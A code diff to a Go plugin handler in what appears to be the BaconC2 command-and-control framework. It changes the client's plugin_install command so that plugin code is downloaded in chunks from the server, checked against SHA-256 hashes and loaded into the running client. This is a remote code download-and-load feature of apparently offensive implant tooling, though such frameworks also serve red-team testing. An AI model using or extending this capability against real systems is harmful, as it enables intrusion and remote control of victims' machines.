@@ -1,66 +1,114 @@
 package plugins
 
 import (
+	"crypto/sha256"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
 
+	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
+	"github.com/RabbITCybErSeC/BaconC2/pkg/logging"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/plugins"
 )
 
 type ClientPluginCommands struct {
 	manager *plugins.PluginManager
+	fetcher transport.IPluginFetcher
 }
 
-func NewPluginCommands(manager *plugins.PluginManager) *ClientPluginCommands {
+func NewPluginCommands(manager *plugins.PluginManager, fetcher transport.IPluginFetcher) *ClientPluginCommands {
 	return &ClientPluginCommands{
 		manager: manager,
+		fetcher: fetcher,
 	}
 }
 
 func (pc *ClientPluginCommands) HandlePluginInstall(cmd models.Command) models.CommandResult {
-	if len(cmd.Args) < 2 {
+	if len(cmd.Args) < 1 {
 		return models.CommandResult{
 			ID:         cmd.ID,
 			Status:     models.CommandStatusFailed,
-			Output:     "Error: plugin_install requires pluginName and encodedData",
+			Output:     "Error: plugin_install requires pluginName",
 			ResultType: models.ResultTypeError,
 		}
 	}
 
 	pluginName := cmd.Args[0]
-	encodedData := cmd.Args[1]
 	expectedHash := ""
-	if len(cmd.Args) >= 3 {
-		expectedHash = cmd.Args[2]
+	if len(cmd.Args) >= 2 {
+		expectedHash = cmd.Args[1]
 	}
 
-	data, err := base64.StdEncoding.DecodeString(encodedData)
+	logging.Info("Fetching plugin metadata for '%s'", pluginName)
+	metadata, err := pc.fetcher.FetchPluginMetadata(pluginName)
 	if err != nil {
 		return models.CommandResult{
 			ID:         cmd.ID,
 			Status:     models.CommandStatusFailed,
-			Output:     fmt.Sprintf("Failed to decode plugin data: %v", err),
+			Output:     fmt.Sprintf("Failed to fetch plugin metadata: %v", err),
 			ResultType: models.ResultTypeError,
 		}
 	}
 
-	
-	if expectedHash != "" {
-		actualHash := plugins.CalculateHashBytes(data)
-		if actualHash != expectedHash {
-			return models.CommandResult{
-				ID:         cmd.ID,
-				Status:     models.CommandStatusFailed,
-				Output:     fmt.Sprintf("Hash mismatch: expected %s, got %s", expectedHash, actualHash),
-				ResultType: models.ResultTypeError,
-			}
+	if expectedHash != "" && metadata.Hash != expectedHash {
+		return models.CommandResult{
+			ID:         cmd.ID,
+			Status:     models.CommandStatusFailed,
+			Output:     fmt.Sprintf("Hash mismatch: expected %s, got %s", expectedHash, metadata.Hash),
+			ResultType: models.ResultTypeError,
 		}
 	}
 
-	
-	if err := pc.manager.LoadPluginFromBytes(pluginName, data); err != nil {
+	logging.Info("Downloading plugin '%s' in %d chunks", pluginName, metadata.TotalChunks)
+	pluginData := make([]byte, 0, metadata.TotalSize)
+
+	for i := 0; i < metadata.TotalChunks; i++ {
+		chunk, err := pc.fetcher.FetchPluginChunk(pluginName, i)
+		if err != nil {
+			return models.CommandResult{
+				ID:         cmd.ID,
+				Status:     models.CommandStatusFailed,
+				Output:     fmt.Sprintf("Failed to fetch chunk %d/%d: %v", i+1, metadata.TotalChunks, err),
+				ResultType: models.ResultTypeError,
+			}
+		}
+
+		chunkData, err := base64.StdEncoding.DecodeString(chunk.Data)
+		if err != nil {
+			return models.CommandResult{
+				ID:         cmd.ID,
+				Status:     models.CommandStatusFailed,
+				Output:     fmt.Sprintf("Failed to decode chunk %d: %v", i+1, err),
+				ResultType: models.ResultTypeError,
+			}
+		}
+
+		chunkHash := fmt.Sprintf("%x", sha256.Sum256(chunkData))
+		if chunkHash != chunk.Hash {
+			return models.CommandResult{
+				ID:         cmd.ID,
+				Status:     models.CommandStatusFailed,
+				Output:     fmt.Sprintf("Chunk %d hash mismatch", i+1),
+				ResultType: models.ResultTypeError,
+			}
+		}
+
+		pluginData = append(pluginData, chunkData...)
+		logging.Debug("Downloaded chunk %d/%d", i+1, metadata.TotalChunks)
+	}
+
+	actualHash := plugins.CalculateHashBytes(pluginData)
+	if actualHash != metadata.Hash {
+		return models.CommandResult{
+			ID:         cmd.ID,
+			Status:     models.CommandStatusFailed,
+			Output:     fmt.Sprintf("Final hash mismatch: expected %s, got %s", metadata.Hash, actualHash),
+			ResultType: models.ResultTypeError,
+		}
+	}
+
+	if err := pc.manager.LoadPluginFromBytes(pluginName, pluginData); err != nil {
 		return models.CommandResult{
 			ID:         cmd.ID,
 			Status:     models.CommandStatusFailed,
@@ -72,7 +120,7 @@ func (pc *ClientPluginCommands) HandlePluginInstall(cmd models.Command) models.C
 	return models.CommandResult{
 		ID:         cmd.ID,
 		Status:     models.CommandStatusCompleted,
-		Output:     fmt.Sprintf("Plugin '%s' installed and loaded successfully", pluginName),
+		Output:     fmt.Sprintf("Plugin '%s' installed successfully (%d bytes)", pluginName, len(pluginData)),
 		ResultType: models.ResultTypeText,
 	}
 }
